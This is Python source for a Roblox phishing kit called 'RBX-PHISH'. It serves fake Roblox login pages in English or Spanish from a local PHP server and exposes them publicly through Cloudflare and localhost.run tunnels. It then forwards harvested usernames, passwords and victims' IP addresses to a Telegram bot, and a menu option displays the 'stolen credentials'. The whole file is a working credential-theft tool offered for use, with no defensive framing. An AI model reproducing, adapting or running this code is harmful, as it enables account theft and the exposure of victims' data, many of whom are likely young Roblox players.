import os
import time
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
import requests
import json

telegram_token = " "  # Тук сложи твоя Telegram Bot Token
chat_id = " "  # Тук сложи Chat ID

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"  
    }
    response = requests.post(url, json=payload)
    try:
        response.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(f"Failed to send message: {err}")

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text) + "\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

cf_file = "logs/cf.log"
lhr_file = "logs/lhr.log"
cf_log = open(cf_file, 'w')
lhr_log = open(lhr_file, 'w')


if os.path.isfile('server/cloudflared'):
   pass
else:
  print('\n\033[31m[!] Cloudflare not installed')
  print('\n\033[32m[~] Installing Cloudflare...')
  os.system("bash modules/install.sh")

def process_and_send_data(file_path, description_title):
    if os.path.isfile(file_path):
        with open(file_path, 'r') as f:
            data = f.read()
            formatted_data = f"*{description_title}*\n```\n{data}\n```"
            send_to_telegram(formatted_data)
       
        os.system(f"cat {file_path} >> {file_path}_saved.txt")
        os.remove(file_path)

def spanishmenu():
    os.system("clear")
    print('''\033[31m
                
                                                                           
@@@@@@@   @@@@@@@   @@@  @@@  @@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@  
@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@  @@@  
@@!  @@@  @@!  @@@  @@!  !@@  @@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  
!@!  @!@  !@   @!@  !@!  @!!  !@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  
@!@!!@!   @!@!@!@    !@@!@!   @!@@!@!   @!@!@!@!  !!@  !!@@!!    @!@!@!@!  
!!@!@!    !!!@!!!!    @!!!    !!@!!!    !!!@!!!!  !!!   !!@!!!   !!!@!!!!  
!!: :!!   !!:  !!!   !: :!!   !!:       !!:  !!!  !!:       !:!  !!:  !!!  
:!:  !:!  :!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:      !:!   :!:  !:!  
::   :::   :: ::::   ::  :::   ::       ::   :::   ::  :::: ::   ::   :::  
 :   : :  :: : ::    :   ::    :         :   : :  :    :: : :     :   : :  
                                                                           
                   |------------by:h1tctx-----------|
                                                                            \033[0m''')

    print('\n\033[31m[:] Setup💀')
    print('\n[1] Start tgbot🪬')
    num = int(input('\n>> '))
    if num == 2:
        print('\n[~] Starting php server...')
        os.system("php -S localhost:8080 -t pages/roblox_es > /dev/null 2>&1 &")
        time.sleep(2)
        print('[~] Server php: online')
        print('[~] Creating links...')
        bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
        bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
        cf_success = False
        for i in range(10):
            cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
            if cf_url != "":
                cf_success = True
                break
            time.sleep(1)
        for i in range(10):
            lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
            if lhr_url != "":
                lhr_success = True
                break
            time.sleep(1)
        print(f'[~] Link: {cf_url}')
        print(f'\n[~] Localhost.run: {lhr_url}')
        print('\n[~] Waiting for data...')
        while True:
            process_and_send_data('pages/roblox_es/usuarios.txt', "Usuarios encontrados")
            process_and_send_data('pages/roblox_es/ip.txt', "IP encontrados")
            time.sleep(1)

    elif num == 1:
        print('\n[~] Starting php server...')
        os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
        time.sleep(2)
        print('[~] Server php: online')
        print('[~] Creating links...')
        bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
        bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
        cf_success = False
        for i in range(10):
            cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
            if cf_url != "":
                cf_success = True
                break
            time.sleep(1)
        for i in range(10):
            lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
            if lhr_url != "":
                lhr_success = True
                break
            time.sleep(1)
        print(f'[~] Link: {cf_url}')
        print(f'\n[~] Localhost.run: {lhr_url}')
        print('\n[~] Waiting data...')
        while True:
            process_and_send_data('pages/roblox_en/usernames.txt', "[RBXPHISH🪦] Roblox Account")
            process_and_send_data('pages/roblox_en/ip.txt', "IP found")
            time.sleep(1)

def config():
    os.system("clear")
    print('\033[35m██████╗ ██████╗ ██╗  ██╗    \033[36m ██████╗ ██╗  ██╗██╗███████╗██╗  ██')
    time.sleep(0.5)
    print('\033[35m██╔══██╗██╔══██╗╚██╗██╔╝    \033[36m ██╔══██╗██║  ██║██║██╔════╝██║  ██║')
    time.sleep(0.5)
    print('\033[35m██████╔╝██████╔╝ ╚███╔╝\033[35m██\033[36m███╗██████╔╝███████║██║███████╗███████║')
    time.sleep(0.5)
    print('\033[35m██╔══██╗██╔══██╗ ██╔██╗\033[36m╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║')
    time.sleep(0.5)
    print('\033[35m██║  ██║██████╔╝██╔╝ ██╗  \033[36m   ██║     ██║  ██║██║███████║██║  ██║')
    time.sleep(0.5)
    print('\033[35m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝  \033[36m   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝')
    print('\033[33m       ----------|By: Euronymou5|----------')
    print('\n\033[31m[1] Credenciales robadas')
    print('\n\033[31m[2] Volver al menú principal')
    num = int(input('\n>> '))
    if num == 1:
        os.system("clear")
        print('\n\033[31m[!] Credenciales robadas:\033[39m')
        os.system("cat pages/roblox_es/usuarios.txt pages/roblox_en/usernames.txt")
        input("\nPulsa enter para continuar...")
        config()
    elif num == 2:
        spanishmenu()

spanishmenu()
